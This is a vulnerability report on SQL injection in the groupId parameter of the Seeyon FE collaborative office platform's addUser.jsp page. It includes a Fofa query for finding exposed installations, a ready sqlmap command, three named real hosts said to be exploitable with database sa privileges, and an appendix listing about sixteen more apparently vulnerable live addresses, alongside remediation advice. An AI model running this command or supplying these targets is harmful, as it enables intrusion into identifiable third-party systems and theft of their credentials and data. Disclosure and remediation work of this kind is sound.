# Vulnerability Title
Unauthorized SQL Injection Vulnerability in `security_addUser.jsp` Interface of Zhiyuan Interconnect FE Collaborative Office Platform

---

# Vulnerability Description
The FE Collaborative Office Platform developed by Beijing Zhiyuan Interconnect Software Co., Ltd. contains an SQL injection vulnerability in the `/security/addUser.jsp` interface. The input parameters are not properly filtered, allowing attackers to craft malicious requests that trigger the SQL injection vulnerability. Successfully exploiting this vulnerability can lead to the leakage of sensitive database information (such as user credentials and system configurations). Some verified affected systems have a database user with `sa` (system administrator) privileges, representing a high risk.

---

# Affected Products
+ **Affected Product**: Zhiyuan Interconnect FE Collaborative Office Platform (Note: Not the Feiqi Interconnect products).
+ **Verification Feature**: Potentially affected assets can be identified by searching `app="Zhiyuan Interconnect-FE"` using network space mapping tools like Fofa.

---

# Vulnerability Verification and Reproduction
## Vulnerable Location
```plain
http://[Target IP]:9090/security/addUser.jsp?groupId=1*
```

## Reproduction Tool
Automated detection with `sqlmap`:

```bash
sqlmap -u "http://Target IP:9090/security/addUser.jsp?groupId=1" --risk=3 --level=5
```

## Verified Cases
1. **Case 1**: `http://125.91.119.208:9090`
    - sqlmap confirms the vulnerability, user is `sa`![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1740238572202-99e329b3-bd19-4c56-b6c2-a44dae13ca8b.png)
    - Asset Proof ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1740238669827-795088ed-7453-46a7-9fdf-31a4add49046.png)
2. **Case 2**: `http://oa.avit.com.cn:9090`
    - sqlmap confirms the vulnerability, user is `sa`![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1740238689161-33c95786-5c38-4baa-91b3-d7805bccdacd.png)
    - Asset Proof ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1740238702094-12c13534-69b6-4cbd-92a7-4b7dca41276c.png)
3. **Case 3**: `http://218.22.206.38:9090`
    - sqlmap confirms the vulnerability, user is `sa`![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1740238712915-9934175f-3444-4b91-87b3-5f794b9f1a0f.png)
    - Asset Proof ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1740238723703-c5645b32-5089-4b1b-b344-dd9b3451e6d8.png)

---

# Proof of Vulnerability
## Vendor Information
+ **Vendor Name**: 北京致远互联软件股份有限公司
+ **Vendor English Name**: BeiJing Seeyon Internet Software Corp.
+ **Vendor Website**: [www.seeyon.com](https://www.seeyon.com/)
+ **Vendor Email**: [zhangxiu@seeyon.com](mailto:zhangxiu@seeyon.com)
+ **Registered Capital**: 115.158439 million RMB
+ ![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1740239688897-2baca77d-ce5c-42ca-820a-30439b29d463.png)

---

## Technical Details
+ **Technical Details**: The `groupId` parameter is not filtered, and attackers can inject characters (such as `1*`) to trigger database errors or blind injections.

---

# Remediation Suggestions
1. **Input Filtering**: Implement strict type checks (e.g., force conversion to integers) and filter special characters for parameters such as `groupId`.
2. **Prepared Statements**: Use parameterized queries instead of dynamically concatenating SQL queries.
3. **Least Privilege**: Reduce the privileges of the database connection accounts and avoid using high-privilege accounts like `sa`.
4. **Patch and Upgrade**: Contact Zhiyuan Interconnect for security updates or temporary fixes.

---

# Disclaimer
This report is intended for technical research and vulnerability remediation purposes only. It is prohibited for illegal use. Exploiting vulnerabilities to attack others' systems will result in legal consequences.

---

# Appendix
Other affected assets:

```plain
http://121.33.38.234:9090
http://218.22.206.38:9090
http://52.130.254.228:9090
http://218.17.117.55:9090
http://183.247.156.247:9090
http://121.31.124.114:9090
http://58.247.134.2:9090
http://219.146.165.142:9090
http://183.63.225.100:9090
http://120.82.178.130:9090
http://oa1.longlive.cn:9090
http://125.91.119.208:9090
http://oa.avit.com.cn:9090
http://14.145.142.223:9090
http://183.59.159.122:9090
https://221.7.151.135
```

